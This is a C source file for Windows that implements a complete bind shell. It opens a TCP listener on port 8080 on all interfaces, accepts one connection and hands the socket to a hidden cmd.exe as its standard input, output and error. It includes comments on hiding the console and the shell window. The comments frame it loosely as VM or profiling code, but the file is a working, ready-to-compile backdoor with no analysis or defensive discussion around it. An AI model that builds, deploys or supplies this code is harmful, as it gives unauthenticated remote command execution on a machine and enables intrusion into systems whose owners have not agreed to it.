#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>

// Link with Ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")

int main()
{
    // Hide the application console window if desired for background profiling
    // FreeConsole();

    WSADATA wsaData;
    SOCKET listenSocket = INVALID_SOCKET;
    SOCKET clientSocket = INVALID_SOCKET;

    struct sockaddr_in serverAddr;
    int port = 8080; // The port your VM will listen on

    // 1. Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        fprintf(stderr, "[-] WSAStartup failed.\n");
        return 1;
    }

    // 2. Create the listening socket (IPv4, Stream, TCP)
    // --- NEW COMPATIBLE BLOCK ---
    // We create the socket using WSASocketA and pass 0 to dwFlags (omitting WSA_FLAG_OVERLAPPED)
    listenSocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    if (listenSocket == INVALID_SOCKET)
    {
        fprintf(stderr, "[-] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // 3. Configure the address structure
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(port);
    serverAddr.sin_addr.s_addr = INADDR_ANY; // Listen on all network interfaces

    // 4. Bind the socket
    if (bind(listenSocket, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        fprintf(stderr, "[-] Bind failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    // 5. Start listening for inbound connections
    if (listen(listenSocket, SOMAXCONN) == SOCKET_ERROR)
    {
        fprintf(stderr, "[-] Listen failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    printf("[+] Listening for inbound traffic on port %d...\n", port);

    // 6. Accept a client connection (Blocking call)
    clientSocket = accept(listenSocket, NULL, NULL);
    if (clientSocket == INVALID_SOCKET)
    {
        fprintf(stderr, "[-] Accept failed: %d\n", WSAGetLastError());
        closesocket(listenSocket);
        WSACleanup();
        return 1;
    }

    // Once connected, we no longer need the master listening socket open
    closesocket(listenSocket);

    // --- Standard C Bind Shell Flow ---
    // 7. Redirect cmd.exe's input/output handles directly over the client socket.
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Configure the process startup flags to pass socket handles
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // Hide the cmd.exe window from view

    // Cast the socket descriptor into the standard handle descriptors
    si.hStdInput = (HANDLE)clientSocket;
    si.hStdOutput = (HANDLE)clientSocket;
    si.hStdError = (HANDLE)clientSocket;

    char processName[] = "C:\\Windows\\System32\\cmd.exe";

    // 8. Spawn cmd.exe natively as a child process
    // Because the handles are mirrored, cmd.exe auto-routes all data via TCP.
    if (!CreateProcessA(
            NULL,        // Application Name
            processName, // Command line arguments
            NULL,        // Process attributes
            NULL,        // Thread attributes
            TRUE,        // Inherit Handles (CRITICAL for socket sharing)
            0,           // Creation flags
            NULL,        // Environment
            NULL,        // Current directory
            &si,         // Startup Info
            &pi          // Process Information
            ))
    {
        fprintf(stderr, "[-] CreateProcess failed: %d\n", GetLastError());
        closesocket(clientSocket);
        WSACleanup();
        return 1;
    }

    // 9. Wait for the interactive shell process to exit
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Clean up handle tracks
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(clientSocket);
    WSACleanup();

    return 0;
}